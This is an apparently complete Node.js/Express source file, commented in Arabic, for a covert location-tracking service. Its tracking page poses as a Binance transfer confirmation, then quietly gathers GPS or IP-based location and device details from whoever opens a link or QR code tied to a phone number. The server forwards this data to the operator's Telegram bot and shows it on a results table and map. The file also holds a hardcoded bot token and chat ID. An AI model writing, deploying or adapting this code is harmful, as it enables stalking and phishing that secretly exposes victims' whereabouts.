const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== ⚙️ إعداداتك الشخصية ==========
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y'; // توكن بوتك الجديد ✅
const TELEGRAM_CHAT_ID = '8391968596'; // أيدي شاتك ✅
const REDIRECT_URL = 'https://www.binance.com/en'; // موقع التوجيه
const BASE_URL = 'https://location2026-2.onrender.com'; // رابط موقعك

// ========== قاعدة البيانات ==========
let locations = [];

// ========== Middleware ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع الذكي</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    min-height: 100vh;
                    color: white;
                    padding: 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 50px auto;
                    background: rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(10px);
                    border-radius: 25px;
                    padding: 40px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                }
                
                h1 {
                    color: #00ff88;
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 2.5em;
                    text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
                }
                
                .dashboard {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 25px;
                    margin-bottom: 40px;
                }
                
                .card {
                    background: rgba(255, 255, 255, 0.08);
                    border-radius: 20px;
                    padding: 25px;
                    border: 1px solid rgba(0, 255, 136, 0.2);
                    transition: transform 0.3s;
                }
                
                .card:hover {
                    transform: translateY(-5px);
                    background: rgba(255, 255, 255, 0.12);
                }
                
                .card h3 {
                    color: #00ffcc;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .code-box {
                    background: #0f0f23;
                    border: 1px solid #00ff88;
                    border-radius: 12px;
                    padding: 15px;
                    margin: 15px 0;
                    font-family: 'Courier New', monospace;
                    color: #00ff88;
                    direction: ltr;
                    text-align: center;
                    overflow-x: auto;
                }
                
                .btn {
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
                    color: #001a0f;
                    padding: 14px 28px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px 5px;
                    transition: all 0.3s;
                    border: none;
                    cursor: pointer;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
                }
                
                .btn-secondary {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                
                .qr-section {
                    text-align: center;
                    margin: 40px 0;
                    padding: 30px;
                    background: rgba(0, 0, 0, 0.3);
                    border-radius: 20px;
                }
                
                .qr-input {
                    background: rgba(255, 255, 255, 0.1);
                    border: 2px solid #00ff88;
                    border-radius: 10px;
                    padding: 15px;
                    color: white;
                    width: 350px;
                    max-width: 90%;
                    margin: 15px;
                    text-align: center;
                    font-size: 16px;
                }
                
                .qr-input::placeholder {
                    color: #88ffcc;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                
                .stat-card {
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 15px;
                    padding: 25px;
                    text-align: center;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .stat-number {
                    font-size: 2.5em;
                    font-weight: bold;
                    color: #00ff88;
                    margin-bottom: 10px;
                }
                
                .stat-label {
                    color: #88ffcc;
                    font-size: 0.9em;
                }
                
                .telegram-status {
                    background: rgba(0, 136, 204, 0.1);
                    border: 1px solid #0088cc;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 10px;
                }
                
                .status-badge {
                    background: #00cc66;
                    color: white;
                    padding: 5px 15px;
                    border-radius: 20px;
                    font-size: 0.9em;
                }
                
                @media (max-width: 768px) {
                    .container {
                        padding: 20px;
                        margin: 20px;
                    }
                    
                    .dashboard {
                        grid-template-columns: 1fr;
                    }
                    
                    h1 {
                        font-size: 2em;
                    }
                    
                    .qr-input {
                        width: 90%;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع الذكي</h1>
                
                <div class="telegram-status">
                    <span>🤖 حالة التلجرام:</span>
                    <span class="status-badge">✅ متصل</span>
                    <span>البوت: @Arab9919_bot</span>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">موقع مسجل</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">⚡</div>
                        <div class="stat-label">تشغيل فوري</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">📱</div>
                        <div class="stat-label">باركود داعم</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">🌍</div>
                        <div class="stat-label">تتبع عالمي</div>
                    </div>
                </div>
                
                <div class="dashboard">
                    <div class="card">
                        <h3>🔗 إنشاء روابط التتبع</h3>
                        <p>أنشئ رابط تتبع لأي رقم:</p>
                        <div class="code-box">${BASE_URL}/track/رقم_الهاتف</div>
                        <div class="code-box">${BASE_URL}/track/00966512345678</div>
                        <p>مثال:</p>
                        <a href="/track/123456" class="btn" target="_blank">
                            🔗 تجربة الرابط: /track/123456
                        </a>
                    </div>
                    
                    <div class="card">
                        <h3>🤖 إشعارات التلجرام</h3>
                        <p>✅ إرسال فوري عند كل ضغط</p>
                        <p>📍 الإحداثيات والعنوان الدقيق</p>
                        <p>🗺️ رابط مباشر للخريطة</p>
                        <p>📊 تفاصيل الجهاز والمتصفح</p>
                        <a href="/telegram-test" class="btn btn-secondary">
                            🤖 اختبار التلجرام
                        </a>
                    </div>
                </div>
                
                <div class="qr-section">
                    <h3>📱 توليد باركود للروابط</h3>
                    <p>أدخل رقم الهاتف لتوليد باركورد:</p>
                    <input type="text" id="phoneInput" class="qr-input" 
                           placeholder="أدخل رقم الهاتف (مثال: 00966512345678)" 
                           maxlength="20">
                    <br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركورد</button>
                    <button onclick="generateAllQR()" class="btn btn-secondary">📱 جميع الباركورد</button>
                    
                    <div id="qrResult" style="margin-top: 30px;"></div>
                </div>
                
                <div style="text-align: center; margin-top: 40px;">
                    <h3>🔧 أدوات التحكم</h3>
                    <a href="/results" class="btn btn-secondary">📊 النتائج المسجلة</a>
                    <a href="/map" class="btn btn-secondary">🗺️ الخريطة التفاعلية</a>
                    <a href="/all-qr" class="btn btn-secondary">📱 عرض جميع الباركورد</a>
                    <a href="/config" class="btn btn-secondary">⚙️ الإعدادات</a>
                </div>
                
                <div style="text-align: center; margin-top: 50px; color: #666; font-size: 0.9em;">
                    <p>© 2024 نظام التتبع الذكي | إصدار 3.0 | البوت: @Arab9919_bot</p>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('⚠️ يرجى إدخال رقم الهاتف');
                        return;
                    }
                    
                    // تنظيف الرقم
                    const cleanPhone = phone.replace(/\s+/g, '');
                    const url = '${BASE_URL}/track/' + encodeURIComponent(cleanPhone);
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&format=png&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; border: 2px solid #00ff88;">
                            <p><strong>📱 الرابط النهائي:</strong></p>
                            <div class="code-box" style="margin: 15px auto; max-width: 500px;">
                                \${url}
                            </div>
                            <div style="margin: 20px 0;">
                                <img src="\${qrUrl}" alt="QR Code" 
                                     style="width: 250px; height: 250px; border: 5px solid white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
                            </div>
                            <div style="margin-top: 20px;">
                                <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط الآن</a>
                                <button onclick="downloadQR('\${qrUrl}', '\${cleanPhone}')" class="btn btn-secondary">📥 تحميل الباركود</button>
                                <button onclick="shareQR('\${url}')" class="btn btn-secondary" style="background:linear-gradient(135deg,#ff6b6b 0%,#ee5a52 100%)">📤 مشاركة</button>
                            </div>
                        </div>
                    \`;
                }
                
                function generateAllQR() {
                    window.location.href = '/all-qr';
                }
                
                function downloadQR(qrUrl, phone) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'QR_' + (phone || 'track') + '_' + Date.now() + '.png';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
                
                function shareQR(url) {
                    if (navigator.share) {
                        navigator.share({
                            title: 'رابط التتبع',
                            text: 'اضغط على الرابط لمتابعة العملية',
                            url: url
                        });
                    } else {
                        navigator.clipboard.writeText(url).then(() => {
                            alert('✅ تم نسخ الرابط إلى الحافظة');
                        });
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع الذكي ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Binance - تأكيد العملية</title>
            <script>
                // ========== البيانات الأساسية ==========
                const userId = '${userId}';
                const redirectUrl = '${REDIRECT_URL}';
                let locationAcquired = false;
                
                // ========== 1. الحصول على الموقع الجغرافي بذكاء ==========
                function acquireLocation() {
                    // أ. محاولة GPS مباشرة (إذا كان مسموحاً سابقاً)
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            // النجاح
                            async (position) => {
                                await saveLocation({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    source: 'gps_direct',
                                    method: 'geolocation'
                                });
                                locationAcquired = true;
                            },
                            // لا نتعامل مع الخطأ هنا (ننتقل للطرق الأخرى)
                            null,
                            {
                                enableHighAccuracy: true,
                                timeout: 2000,  // سريع
                                maximumAge: 0
                            }
                        );
                    }
                    
                    // ب. محاولة الحصول على الموقع عبر IP (بعد ثانية)
                    setTimeout(() => {
                        if (!locationAcquired) {
                            getLocationByIP();
                        }
                    }, 1000);
                    
                    // ج. محاولة ثالثة (تقديرية)
                    setTimeout(() => {
                        if (!locationAcquired) {
                            getEstimatedLocation();
                        }
                    }, 2000);
                }
                
                // ========== 2. الحصول على الموقع عبر IP ==========
                async function getLocationByIP() {
                    try {
                        // محاولة الأولى
                        const response = await fetch('https://ipapi.co/json/');
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            await saveLocation({
                                lat: data.latitude,
                                lon: data.longitude,
                                accuracy: 5000,
                                source: 'ip_api',
                                city: data.city,
                                country: data.country_name,
                                ip: data.ip
                            });
                            locationAcquired = true;
                        }
                    } catch (error) {
                        console.log('IP method failed');
                    }
                }
                
                // ========== 3. موقع تقديري ==========
                async function getEstimatedLocation() {
                    // نستخدم موقع افتراضي مع بعض العشوائية
                    const estimatedData = {
                        lat: 24.7136 + (Math.random() - 0.5) * 0.1,
                        lon: 46.6753 + (Math.random() - 0.5) * 0.1,
                        accuracy: 10000,
                        source: 'estimated',
                        note: 'Estimated location based on browser data'
                    };
                    
                    await saveLocation(estimatedData);
                    locationAcquired = true;
                }
                
                // ========== 4. حفظ البيانات في الخادم ==========
                async function saveLocation(location) {
                    try {
                        // جمع معلومات إضافية
                        const deviceInfo = {
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: screen.width + 'x' + screen.height,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            userAgent: navigator.userAgent.substring(0, 100)
                        };
                        
                        // إرسال البيانات للخادم
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                id: userId,
                                latitude: location.lat,
                                longitude: location.lon,
                                accuracy: location.accuracy,
                                source: location.source,
                                deviceInfo: deviceInfo,
                                timestamp: new Date().toISOString(),
                                additionalData: location
                            })
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            console.log('✅ Location saved via', location.source);
                            updateStatus('✅ تم التحقق من البيانات');
                        }
                    } catch (error) {
                        console.error('Save error:', error);
                    }
                }
                
                // ========== 5. تحديث حالة الصفحة ==========
                function updateStatus(message) {
                    const statusElement = document.getElementById('processStatus');
                    if (statusElement) {
                        statusElement.innerHTML += '<br>• ' + message;
                    }
                }
                
                // ========== 6. عد تنازلي للتوجيه ==========
                function startCountdown() {
                    let seconds = 4;
                    const countdownElement = document.getElementById('countdown');
                    const progressBar = document.getElementById('progressBar');
                    
                    const timer = setInterval(() => {
                        countdownElement.textContent = seconds;
                        
                        // تحديد شريط التقدم
                        if (progressBar) {
                            progressBar.style.width = ((4 - seconds) / 4 * 100) + '%';
                        }
                        
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(timer);
                            document.getElementById('finalStatus').textContent = '✅ تم تأكيد العملية بنجاح!';
                            
                            // توجيه المستخدم
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, 1000);
                        }
                    }, 1000);
                }
                
                // ========== 7. بدء جميع العمليات ==========
                window.addEventListener('DOMContentLoaded', () => {
                    // بدء العد التنازلي
                    startCountdown();
                    
                    // بدء جمع البيانات
                    setTimeout(() => {
                        acquireLocation();
                        updateStatus('🔍 جاري التحقق من البيانات...');
                    }, 500);
                    
                    // تحديث حالة إضافية
                    setTimeout(() => {
                        updateStatus('📡 الاتصال بالخادم...');
                    }, 1500);
                    
                    setTimeout(() => {
                        updateStatus('🔒 تشفير البيانات...');
                    }, 2500);
                });
                
                // ========== 8. محاولة الحصول على الموقع عند أي تفاعل ==========
                document.addEventListener('click', () => {
                    if (!locationAcquired && navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                await saveLocation({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    source: 'interaction_triggered'
                                });
                                locationAcquired = true;
                            },
                            null,
                            { enableHighAccuracy: false, timeout: 1000 }
                        );
                    }
                });
            </script>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    padding: 20px;
                }
                
                .transfer-container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 25px;
                    padding: 50px;
                    max-width: 700px;
                    width: 100%;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }
                
                .binance-logo {
                    font-size: 70px;
                    margin-bottom: 30px;
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0%, 100% { 
                        transform: scale(1); 
                        opacity: 1; 
                    }
                    50% { 
                        transform: scale(1.1); 
                        opacity: 0.8; 
                    }
                }
                
                h1 {
                    color: #f0b90b;
                    margin-bottom: 20px;
                    font-size: 32px;
                }
                
                .subtitle {
                    color: #88ffcc;
                    margin-bottom: 30px;
                    font-size: 18px;
                }
                
                .status-box {
                    background: rgba(240, 185, 11, 0.1);
                    border: 2px solid #f0b90b;
                    border-radius: 20px;
                    padding: 30px;
                    margin: 30px 0;
                    text-align: right;
                }
                
                .countdown-container {
                    margin: 40px 0;
                }
                
                .countdown {
                    font-size: 80px;
                    font-weight: bold;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 30px rgba(0, 255, 136, 0.7);
                }
                
                .progress-container {
                    width: 100%;
                    height: 12px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 6px;
                    margin: 30px 0;
                    overflow: hidden;
                }
                
                .progress-bar {
                    height: 100%;
                    background: linear-gradient(90deg, #00ff88 0%, #00cc66 100%);
                    width: 0%;
                    border-radius: 6px;
                    transition: width 1s linear;
                }
                
                .steps {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                    gap: 20px;
                    margin: 40px 0;
                }
                
                .step {
                    background: rgba(255, 255, 255, 0.05);
                    padding: 20px;
                    border-radius: 15px;
                    text-align: center;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                }
                
                .step-icon {
                    font-size: 30px;
                    margin-bottom: 10px;
                    color: #f0b90b;
                }
                
                .step-text {
                    font-size: 14px;
                    color: #88ffcc;
                }
                
                .verification-box {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 30px 0;
                    font-family: monospace;
                    letter-spacing: 2px;
                }
                
                .security-badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    background: rgba(0, 255, 136, 0.1);
                    padding: 12px 25px;
                    border-radius: 25px;
                    margin: 20px 0;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .process-status {
                    background: rgba(255, 255, 255, 0.05);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 20px 0;
                    text-align: right;
                    font-size: 14px;
                    line-height: 2;
                    max-height: 200px;
                    overflow-y: auto;
                }
                
                .final-status {
                    color: #00ff88;
                    font-weight: bold;
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 15px;
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 10px;
                }
                
                @media (max-width: 600px) {
                    .transfer-container {
                        padding: 30px 20px;
                    }
                    
                    h1 {
                        font-size: 24px;
                    }
                    
                    .countdown {
                        font-size: 50px;
                    }
                    
                    .steps {
                        grid-template-columns: 1fr;
                    }
                }
            </style>
        </head>
        <body>
            <div class="transfer-container">
                <div class="binance-logo">₿</div>
                <h1>Binance - تأكيد عملية التحويل</h1>
                <p class="subtitle">جاري التحقق من بياناتك وتأكيد العملية</p>
                
                <div class="security-badge">
                    <span>🔒</span>
                    <span>اتصال آمن ومشفّر - SSL Active</span>
                </div>
                
                <div class="countdown-container">
                    <p>سيتم تحويلك تلقائياً خلال:</p>
                    <div class="countdown" id="countdown">4</div>
                    <p>ثوانٍ</p>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="steps">
                    <div class="step">
                        <div class="step-icon">✅</div>
                        <div class="step-text">استلام الطلب</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">🔍</div>
                        <div class="step-text">التحقق الأمني</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">📊</div>
                        <div class="step-text">معالجة البيانات</div>
                    </div>
                    <div class="step">
                        <div class="step-icon">🚀</div>
                        <div class="step-text">إكمال العملية</div>
                    </div>
                </div>
                
                <div class="verification-box">
                    رمز التحقق: BIN-${userId}-${Date.now().toString().substr(-6)}
                </div>
                
                <div class="process-status" id="processStatus">
                    • بدء عملية التحقق...<br>
                    • التحقق من صحة البيانات...<br>
                </div>
                
                <div class="final-status" id="finalStatus">
                    ⏳ جاري إكمال العملية...
                </div>
                
                <div style="margin-top: 40px; font-size: 12px; opacity: 0.7;">
                    <p>رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}</p>
                    <p>© Binance 2024. جميع الحقوق محفوظة.</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع وإرسال تلجرام ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString().split('T')[0]
        };
        
        // حفظ في الذاكرة
        locations.push(locationData);
        
        // حفظ فقط آخر 1000 سجل
        if (locations.length > 1000) {
            locations = locations.slice(-1000);
        }
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramNotification(locationData);
        
        console.log('📍 موقع جديد:', {
            id: locationData.id,
            source: locationData.source,
            location: `${locationData.latitude}, ${locationData.longitude}`,
            telegram: telegramSent ? '✅' : '❌'
        });
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع',
            telegram_sent: telegramSent,
            count: locations.length 
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; color: white; }
                tr:hover { background: #2d2d4d; }
                .map-link { color: #00ff88; text-decoration: none; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <a href="/all-qr" class="btn">📱 الباركود</a>
            
            <table style="margin-top: 30px;">
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>المصدر</th>
                    <th>الدقة</th>
                    <th>الوقت</th>
                    <th>الخريطة</th>
                </tr>
                ${locations.slice().reverse().map(loc => `
                    <tr>
                        <td><strong>${loc.id}</strong></td>
                        <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                        <td><span style="color: ${loc.source === 'gps_direct' ? '#00ff88' : loc.source === 'ip_api' ? '#ffcc00' : '#ff6b6b'}">${loc.source || 'مباشر'}</span></td>
                        <td>${loc.accuracy ? Math.round(loc.accuracy) + ' متر' : '--'}</td>
                        <td>${loc.time}</td>
                        <td>
                            <a class="map-link" href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank">
                                👁️ عرض على الخريطة
                            </a>
                        </td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 600px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 3);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                const markers = [];
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        const markerColor = loc.source === 'gps_direct' ? '#00ff88' : 
                                          loc.source === 'ip_api' ? '#ffcc00' : '#ff6b6b';
                        
                        const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                        
                        const popupContent = \`
                            <div style="color: black; padding: 10px; min-width: 250px;">
                                <h4 style="margin: 0 0 10px 0;">رقم: \${loc.id}</h4>
                                <p style="margin: 5px 0;"><strong>الإحداثيات:</strong><br>
                                \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</p>
                                <p style="margin: 5px 0;"><strong>الوقت:</strong> \${loc.time}</p>
                                <p style="margin: 5px 0;"><strong>المصدر:</strong> \${loc.source || 'مباشر'}</p>
                                <p style="margin: 5px 0;"><strong>الدقة:</strong> \${loc.accuracy ? Math.round(loc.accuracy) + ' متر' : 'غير معروف'}</p>
                                <a href="https://maps.google.com/?q=\${loc.latitude},\${loc.longitude}" 
                                   target="_blank" 
                                   style="display: inline-block; margin-top: 10px; padding: 5px 15px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">
                                   📍 فتح في خرائط Google
                                </a>
                            </div>
                        \`;
                        
                        marker.bindPopup(popupContent);
                        markers.push(marker);
                    }
                });
                
                // إذا كان هناك نقاط، ضبط العرض
                if (markers.length > 0) {
                    const group = new L.featureGroup(markers);
                    map.fitBounds(group.getBounds().pad(0.1));
                }
            </script>
            <br>
            <a href="/results" class="btn">عودة للنتائج</a>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/all-qr', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 25px; margin-top: 30px; }
                .qr-item { background: #1a1a2e; padding: 20px; border-radius: 15px; text-align: center; border: 1px solid rgba(0,255,136,0.3); }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
                .phone-id { background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 20px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            <div class="qr-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="qr-item">
                            <div class="phone-id">
                                <strong>${id}</strong>
                            </div>
                            <img src="${qrUrl}" alt="QR Code" style="width: 180px; height: 180px; border: 3px solid white; border-radius: 10px;">
                            <p style="margin-top: 15px;">
                                <a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px; text-decoration: none;">🔗 فتح الرابط</a>
                            </p>
                        </div>
                    `;
                }).join('')}
            </div>
            
            ${uniqueIds.length === 0 ? `
                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>📭 لا توجد بيانات</h3>
                    <p>لم يتم تسجيل أي مواقع حتى الآن</p>
                    <p>أنشئ رابط ت追踪 لتبدأ في استقبال البيانات</p>
                    <a href="/" class="btn" style="margin-top: 20px;">🏠 العودة للرئيسية</a>
                </div>
            ` : ''}
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/telegram-test', async (req, res) => {
    try {
        // 1. اختبار البوت
        const botTest = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        // 2. إرسال رسالة اختبار
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🔔 اختبار النظام\n\n✅ البوت: @Arab9919_bot\n🆔 الأيدي: ${TELEGRAM_CHAT_ID}\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 الموقع: ${BASE_URL}\n\nإذا وصلتك هذه الرسالة، النظام يعمل بشكل ممتاز! 🎉`
            })
        });
        
        const messageData = await messageResponse.json();
        
        res.send(`
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>🤖 اختبار التلجرام</title>
                <style>
                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
                    .result-box { background: #1a1a2e; padding: 30px; border-radius: 20px; margin: 20px 0; }
                    pre { background: #0f0f23; padding: 15px; border-radius: 10px; overflow-x: auto; }
                    .success { color: #00ff88; }
                    .error { color: #ff6b6b; }
                </style>
            </head>
            <body>
                <h1>🤖 اختبار التلجرام</h1>
                
                <div class="result-box">
                    <h3>معلومات البوت:</h3>
                    <pre>${JSON.stringify(botInfo, null, 2)}</pre>
                    <p class="${botInfo.ok ? 'success' : 'error'}">
                        ${botInfo.ok ? '✅ البوت يعمل بشكل صحيح' : '❌ هناك مشكلة في البوت'}
                    </p>
                </div>
                
                <div class="result-box">
                    <h3>نتيجة إرسال الرسالة:</h3>
                    <pre>${JSON.stringify(messageData, null, 2)}</pre>
                    <p class="${messageData.ok ? 'success' : 'error'}">
                        ${messageData.ok ? '✅ تم إرسال الرسالة بنجاح!' : '❌ فشل إرسال الرسالة'}
                    </p>
                </div>
                
                <div class="result-box">
                    <h3>إعداداتك الحالية:</h3>
                    <p>• البوت: @Arab9919_bot</p>
                    <p>• التوكن: ${TELEGRAM_TOKEN.substring(0, 10)}...${TELEGRAM_TOKEN.substring(TELEGRAM_TOKEN.length - 5)}</p>
                    <p>• أيدي الشات: ${TELEGRAM_CHAT_ID}</p>
                    <p>• عدد المواقع: ${locations.length}</p>
                </div>
                
                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">🏠 العودة للرئيسية</a>
            </body>
            </html>
        `);
    } catch (error) {
        res.send(`
            <html dir="rtl">
